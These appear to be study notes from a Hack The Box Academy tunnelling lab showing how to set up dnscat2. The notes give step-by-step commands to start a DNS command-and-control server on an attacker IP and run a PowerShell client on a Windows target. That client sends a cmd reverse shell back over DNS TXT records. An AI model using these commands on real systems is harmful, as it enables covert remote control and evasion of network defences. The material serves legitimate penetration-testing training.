- [Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts.
	- It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol.
- This gives a very slow non TTY shell. Backspace does not work.

## Setup and Use dnscat2

#### Clone dnscat2 and set up server
``` bash
git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/server/
gem install bundler
bundle install
```

#### Start dnscat2 server
``` bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
![[2023-04-12 11_43_34-Hack The Box - Academy.png|600]]
- After runing, it will provide us the secret key
	- We will have to provite it to our dnscat2 client on the Windows host so it can auth and encrypt the data that is sent to the external dnscat2 server.
- We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) a compatabile PowerShell based client we can run from Windows targets.
	- We can clone the project containing the client to our attack hos and then transfer it to the target.

#### Clone dnscat2-powershell to the Attack Host
``` bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
- Once we transfer it to the target:

#### Import dnscat2.ps1
``` powershell
Set-ExecutionPolicy Unrestricted
Import-Module .\dnscat2.ps1
```

#### Send a CMD shell session back to our server
``` powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

- We should see a cmd session on the server.
- Use `?` to list commands
- We can drop an established session into a shell with
	- `window -i 1` 